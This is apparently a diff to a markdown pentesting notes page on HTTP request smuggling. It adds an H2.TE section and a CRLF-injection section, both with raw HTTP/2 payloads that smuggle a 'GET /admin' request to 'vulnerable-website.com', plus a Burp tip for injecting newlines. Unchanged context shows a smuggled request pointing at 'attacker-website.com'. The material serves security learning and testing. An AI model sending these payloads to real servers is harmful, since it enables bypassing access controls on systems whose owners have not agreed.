@@ -228,9 +228,7 @@ Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 100
 
-email=POST /login HTTP/1.1
-Host: vulnerable-website.com
-...
+email=
 ```
 
 ```html
@@ -317,7 +315,6 @@ Transfer-Encoding: chunked
 GET /home HTTP/1.1
 Host: attacker-website.com
 Foo: X
-
 ```
 
 ## <mark style="color:yellow;">Content-Length in the smuggled request</mark>
@@ -340,10 +337,10 @@ Host: vulnerable-website.com
 Content-Length: 0
 
 GET /404 HTTP/1.1
-Foo: x 
+Foo: x
 ```
 
-Then send another request. In this way the second one will get `/404` .
+Then send another request and you'll get `/404` .
 
 ### <mark style="color:yellow;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>
 
@@ -375,6 +372,44 @@ Content-Length: 5
 
 x=1
 ```
+
+### <mark style="color:yellow;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>
+
+```http
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: x
+```
+
+## <mark style="color:yellow;">Request smuggling via CRLF injection</mark> <a href="#request-smuggling-via-crlf-injection" id="request-smuggling-via-crlf-injection"></a>
+
+In HTTP/2 messages `\r\n` no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split. when this is rewritten as an HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers.
+
+E.g. with **H2.TE**
+
+```http
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+foo: \r\nTransfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: x
+```
+
+{% hint style="info" %}
+**Note**: to inject newlines into HTTP/2 headers, in burp use the Inspector to drill down into the header, then press the `Shift + Return` keys.
+{% endhint %}
 
 
 
